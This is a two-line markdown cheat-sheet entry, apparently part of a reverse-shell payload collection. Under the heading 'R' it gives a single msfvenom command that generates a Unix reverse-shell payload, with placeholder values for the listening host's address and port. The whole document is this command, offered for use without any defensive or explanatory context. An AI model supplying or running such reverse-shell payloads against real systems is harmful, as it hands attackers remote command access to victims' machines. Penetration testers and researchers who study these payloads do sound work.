# R

## 01 - Generate a payload via `msfvenom`

```
$ msfvenom -p cmd/unix/reverse_r lhost=<IP> lport=<PORT>
```